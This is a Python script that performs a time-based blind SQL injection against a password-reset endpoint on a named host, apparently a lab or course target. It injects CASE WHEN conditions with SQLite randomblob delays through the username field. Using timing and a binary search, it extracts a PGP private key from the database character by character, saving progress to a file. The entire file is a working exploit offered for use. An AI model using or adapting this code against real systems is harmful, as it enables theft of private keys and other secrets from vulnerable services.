import time
from statistics import median
import requests
from loguru import logger
import os

API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
API_RUNS = 100
THRESHOLD_SECONDS = 2.0  # Safe gap for differential timing

def check_payload_true(known_user, sql_payload, threshold):
    # 1. Dynamic Baseline (Adaptive)
    # Instead of waiting for < 0.35s, we take the median of 3 probes
    # to find out what "normal" is RIGHT NOW.
    baseline_probes = []
    for _ in range(3):
        t = measure_response_time(API_URL, known_user)
        baseline_probes.append(t)
    
    # Use median to ignore random spikes
    baseline_time = median(baseline_probes)

    # 2. Measure the Injection Time
    injection_times = []
    for attempt in range(5): 
        injection_time = measure_response_time(API_URL, sql_payload)
        injection_times.append(injection_time)
        
        # Optimization: If response is faster than baseline + threshold, 
        # it definitely didn't trigger the delay. Return False early.
        if injection_time < (baseline_time + threshold): 
             return False

    # 3. Calculate the ACTUAL delay
    # We use max() to be generous to the injection attempt
    max_injection = max(injection_times)
    actual_delay = max_injection - baseline_time
    
    boolean_result = actual_delay > threshold
    
    # Log only if interesting (True or close call)
    if boolean_result or actual_delay > (threshold / 2):
        logger.debug(f"Base: {baseline_time:.2f}s | Inj: {max_injection:.2f}s | Diff: {actual_delay:.2f}s | Result: {boolean_result}")

    return boolean_result


def build_sql_payload(condition):
    # Randomblob delay for SQLite
    delay_size = 250000000  
    
    return {
        "username": f"admin' AND (CASE WHEN ({condition}) THEN (abs(randomblob({delay_size}))) ELSE 0 END) --"
    }

def measure_response_time(url, input):
    try:
        start = time.perf_counter()
        r = requests.post(f"{url}", data=input, timeout=30) 
        end = time.perf_counter()
        return end - start
    except requests.RequestException as e:
        logger.error(f"Request failed: {e}")
        return 0.0

def discover_char(known_user, key_index):
    # 1. Define the specific PGP ASCII Armor + Header character set
    # We use a set to automatically handle duplicates and then sort it.
    valid_chars = sorted(list(set(
        [10, 13] +                       # Control: \n (10), \r (13)
        [32] +                           # Space (32)
        [43, 46, 47, 45] +               # Symbols: + (43), . (46), / (47), - (45)
        [58, 61] +                       # Header/Padding: : (58), = (61)
        list(range(48, 58)) +            # Numbers: 0-9
        list(range(65, 91)) +            # Uppercase: A-Z
        list(range(97, 123))             # Lowercase: a-z
    )))
    
    # Note: I also added '-' (45) above because Version strings often use it 
    # (e.g., "GnuPG v1.4-beta") or it might appear in comments.

    while True:
        # Search through the INDICES of valid_chars
        low_idx = 0
        high_idx = len(valid_chars) - 1

        while low_idx <= high_idx:
            mid_idx = (low_idx + high_idx) // 2
            mid_val = valid_chars[mid_idx]

            # Binary search comparison
            condition = f"unicode(substr(key,{key_index + 1},1))>{mid_val}"
            sql_payload = build_sql_payload(condition)

            if check_payload_true(known_user, sql_payload, THRESHOLD_SECONDS):
                low_idx = mid_idx + 1
            else:
                high_idx = mid_idx - 1
        
        # Fuzzy Verification: Check the result + neighbors
        candidates_indices = [low_idx, low_idx - 1, low_idx + 1]
        
        for idx in candidates_indices:
            # Ensure index is within bounds of our list
            if idx < 0 or idx >= len(valid_chars):
                continue
            
            cand_ascii = valid_chars[idx]
            candidate_char = chr(cand_ascii)
            
            verify_condition = f"unicode(substr(key,{key_index + 1},1))={cand_ascii}"
            verify_payload = build_sql_payload(verify_condition)
            
            if check_payload_true(known_user, verify_payload, THRESHOLD_SECONDS):
                return candidate_char

        logger.warning(f"[-] Verification failed for index {key_index}. Retrying...")
        


def sql_injection_attack():
    logger.info(f"Starting SQL Injection Attack against the API at {API_URL}")
    known_user = {"username": "admin"}
    
    prefix = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
    suffix = "-----END PGP PRIVATE KEY BLOCK-----"
    file_path = "extracted_key.txt"
    
    # Variable to hold the starting point (defaults to just the prefix)
    current_key = prefix
    is_resuming = False

    # --- 1. CHECKPOINT VALIDATION ---
    if os.path.exists(file_path):
        logger.info(f"Found checkpoint file: {file_path}")
        
        with open(file_path, "r") as f:
            checkpoint_data = f.read()

        # Sanity check: It must at least start with the PGP header
        if checkpoint_data.startswith(prefix):
            
            # Condition: Does the DB key match our file exactly so far?
            # substr(key, 1, length) = 'file_content'
            condition = f"substr(key,1,{len(checkpoint_data)})='{checkpoint_data}'"
            payload = build_sql_payload(condition)

            logger.info(f"Verifying checkpoint integrity ({len(checkpoint_data)} chars)...")
            
            if check_payload_true(known_user, payload, THRESHOLD_SECONDS):
                logger.success("✅ Checkpoint validated! Resuming from saved state.")
                current_key = checkpoint_data
                is_resuming = True
            else:
                logger.warning("❌ Checkpoint validation failed (DB mismatch). Restarting from scratch.")
        else:
            logger.warning("⚠️ Checkpoint file corrupted (wrong header). Restarting from scratch.")

    # --- 2. FALLBACK: PREFIX VALIDATION ---
    # Only check the prefix if we aren't already resuming from a valid checkpoint
    if not is_resuming:
        prefix_payload = build_sql_payload(f"substr(key,1,{len(prefix)})='{prefix}'")
        logger.info("Checking if the key starts with the expected PGP header...")
        
        if check_payload_true(known_user, prefix_payload, THRESHOLD_SECONDS):
            logger.info("✅ Prefix check passed")
        else:
            logger.error("❌ Prefix check failed. The key does not start with the expected PGP header. Aborting attack.")
            exit(1)

    # --- 3. START EXTRACTION ---
    key = current_key
    key_index = len(key)  
    
    logger.info(f"🔍 Starting key extraction at index {key_index}")
    
    while not key.endswith(suffix):
        character = discover_char(known_user, key_index)
        key = key + character
        key_index += 1
        modulo_index = key_index % 10
        if modulo_index == 0:
            logger.info(f"Extracted {key_index} characters so far: tail -> '{key[-30:]}'")

        with open(file_path, "w") as f:
            f.write(key)   
            
        if len(key) > 5000:
            logger.warning("\nStopping: Key exceeded 5000 characters.")
            break

    logger.success(f"\nKey extraction completed. Saved to {file_path}")
    with open(file_path, "w") as f:
        f.write(key)

if __name__ == '__main__':
    sql_injection_attack()